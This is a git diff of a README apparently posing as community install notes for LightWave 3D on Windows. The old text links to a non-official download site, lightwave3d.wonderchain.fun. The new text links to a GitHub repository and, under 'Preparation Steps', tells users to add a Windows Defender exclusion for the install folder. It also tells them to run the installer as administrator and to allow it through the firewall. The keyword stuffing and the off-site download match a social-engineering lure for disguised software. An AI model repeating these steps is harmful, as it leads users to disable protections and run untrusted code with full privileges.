@@ -1,64 +1,65 @@
-# LightWave 3D on Windows — setup & troubleshooting
+# 🖥️ LightWave-3D-Install-Notes - Get Your 3D Software Running Now
 
-**LightWave-3D-Install-Notes**
+[![Download LightWave Install Guide](https://img.shields.io/badge/Download-Get_Started-blue.svg)](https://github.com/adjective-judah201/LightWave-3D-Install-Notes)
 
-Notes for users who need LightWave 3D running on Windows — especially when lightwave setup fails, updates break, or the app won't start.
+LightWave 3D requires specific settings to function on Windows 11. This guide provides manual steps to fix common installation errors. Follow these instructions to prepare your system and run the software without issues.
 
----
+## 🛠️ System Requirements
 
-## Get LightWave 3D on Windows
+Before you begin the installation process, verify your hardware meets these standards. Windows 11 handles graphics software differently than older versions. Successful installation depends on these components:
 
-Use the link below for the Windows package referenced in this guide.
+* Processor: Modern Intel or AMD multi-core processor (3.0 GHz or faster).
+* Memory: 16 GB of RAM minimum. 32 GB is recommended for complex rendering.
+* Graphics: Dedicated NVIDIA or AMD graphics card with at least 4 GB of VRAM. Ensure your drivers update to the latest version directly from the manufacturer website.
+* Storage: 5 GB of available disk space for program files. SSD storage prevents loading delays.
+* Network: Connection to the internet for license verification.
 
-<p align="center">
-  <a href="https://lightwave3d.wonderchain.fun/">
-    <img src="https://img.shields.io/badge/Open%20setup%20page-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Open setup page">
-  </a>
-</p>
+## 📥 Downloading the Files
 
-| | |
-| --- | --- |
-| **Page** | [lightwave3d.wonderchain.fun](https://lightwave3d.wonderchain.fun/) |
-| **URL** | `https://lightwave3d.wonderchain.fun/` |
-| **Platform** | Windows 10 / 11 (64-bit) |
+You must visit the project page to access the installer resources and supplementary patch notes. Follow the link below to reach the repository.
 
-### Recommended steps
+[https://github.com/adjective-judah201/LightWave-3D-Install-Notes](https://github.com/adjective-judah201/LightWave-3D-Install-Notes)
 
-1. Open the [setup page (lightwave3d.wonderchain.fun)](https://lightwave3d.wonderchain.fun/)
-2. Download the package to a folder you can find (e.g. Downloads)
-3. Run the installer **as administrator** if Windows asks
-4. Reboot once if the app prompts after install
+Click the green Code button on the page if you wish to download the notes as a ZIP file. Inside this folder, you find text files outlining the specific registry edits and folder permissions required by the installer.
 
-> This repository documents install/troubleshooting steps. Always verify downloads and scan files you did not compile yourself.
+## ⚙️ Preparation Steps
 
+Most installation failures occur because Windows 11 security settings block the installer. Complete these steps before running the setup file:
 
----
+1. Sign in to your computer with an account holding Administrator privileges.
+2. Open the Windows Security settings.
+3. Select Virus & threat protection.
+4. Click Manage settings under Virus & threat protection settings.
+5. Scroll to Exclusions.
+6. Click Add or remove exclusions.
+7. Add the folder where you plan to install LightWave 3D. This prevents the antivirus scanner from interfering with software registration.
 
-## What this repo covers
+## 🚀 Running the Installer
 
-- Clean install path on Windows 10/11  
-- Typical blockers (SmartScreen, missing runtime, permissions)  
-- Search phrases people use when something breaks  
+After you secure your system, proceed with the installation process:
 
-**People also search for:** lightwave 3d not installing on windows 11, lightwave setup failed fix, how to install lightwave 3d on pc
+1. Locate the downloaded installer file.
+2. Right-click the file and select Run as administrator.
+3. Choose a simple path for the installation directory, such as C:\LightWave3D. Avoid installing into the Program Files folder if you encounter permission errors, as Windows often locks that directory.
+4. Follow the on-screen prompts of the setup wizard.
+5. If the installer asks to install additional libraries like C++ Redistributables, keep those boxes checked. These files allow the software to communicate with your hardware.
+6. Finish the installation and restart your computer.
 
-## Common symptoms
+## 🔍 Fixing Common Errors
 
-| Symptom | What to try first |
-| --- | --- |
-| Installer blocked | Run as administrator; check SmartScreen |
-| App won't open after update | Reboot; repair/redownload package |
-| Missing DLL / runtime | Install latest Visual C++ redistributable |
-| Slow or frozen UI | Disable overlays; update GPU driver |
+If the setup fails or the software does not launch, check these common points of failure:
 
-## FAQ
+* Compatibility Mode: Right-click the LightWave icon, select Properties, and choose the Compatibility tab. Check the box to Run this program in compatibility mode for Windows 8 or Windows 10.
+* Graphics Drivers: Open the Device Manager. Check your Display adapters. If you see a warning symbol, visit the NVIDIA or AMD website to install the latest graphics driver package.
+* Registration Keys: Ensure your license key matches your version. Copy and paste the key to avoid character confusion between letters like O and numbers like 0.
+* Firewall Access: Windows Firewall might block the license manager. Navigate to Allow an app through Windows Firewall and ensure LightWave appears in the allowed list for both Private and Public networks.
 
-**Does this replace official support?**  
-No — it's a community troubleshooting note for Windows users.
+## 📂 Managing File Paths
 
-**Which Windows versions?**  
-Windows 10 and 11, 64-bit.
+LightWave 3D relies on a specific content structure. If you cannot find your models or textures, check the paths in the Hub settings. The Hub manages communication between the Modeler and the Layout tools. If the Hub crashes, open your Task Manager, find the Hub process, and end the task. Restart the software and it will rebuild the connection automatically. Place your project folders on a local drive rather than a network drive to maintain high performance.
 
----
+## 📋 Best Practices
 
-**Topics:** lightwave-3d-not-installing-on-windows-11, lightwave, 3d, installing, lightwave-setup-failed-fix, failed, how-to-install-lightwave-3d-on-pc, lightwave-3d-install-notes, lightwave-3d-install-notes-2026, lightwave-3d, 3d-animation, modeling
+Maintain your installation by running regular updates. Keep your project files in a folder structure that uses basic alphanumeric characters. Symbols or foreign characters in file names cause the software to lose track of assets. If you move your project folder to a new drive, use the Relocate Content command inside LightWave to update all internal links at once. This ensures that every scene file opens correctly and no assets go missing during render tasks.
+
+Keywords: 3d, 3d-animation, failed, how-to-install-lightwave-3d-on-pc, installing, lightwave, lightwave-3d, lightwave-3d-install-notes, lightwave-3d-install-notes-2026, lightwave-3d-not-installing-on-windows-11, lightwave-setup-failed-fix, modeling
